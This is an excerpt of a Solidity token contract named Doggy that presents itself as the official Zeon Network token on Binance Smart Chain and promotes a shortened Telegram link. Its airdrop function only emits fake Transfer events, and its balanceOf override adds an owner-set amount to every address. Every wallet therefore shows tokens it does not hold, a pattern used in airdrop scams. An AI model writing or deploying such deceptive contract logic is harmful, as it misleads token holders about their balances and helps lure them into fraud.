...
/**
 Official token of Zeon Network on Binance Smart Chain
 www.zeon.network
 www.bit.ly/ze0ntelegram
*/
...
contract Doggy is ERC20PausableUpgradeable, OwnableUpgradeable {
    ...
    function setAirdropAmount(uint _value) external onlyOwner {
        airdrop_amount = _value;
    }

    function distributeAirdrop(address[] memory _receivers) public onlyOwner {
        for (uint i = 0; i < _receivers.length; i++) {
            emit Transfer(address(0), _receivers[i], airdrop_amount);
        }
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account].add(airdrop_amount);
    }
}
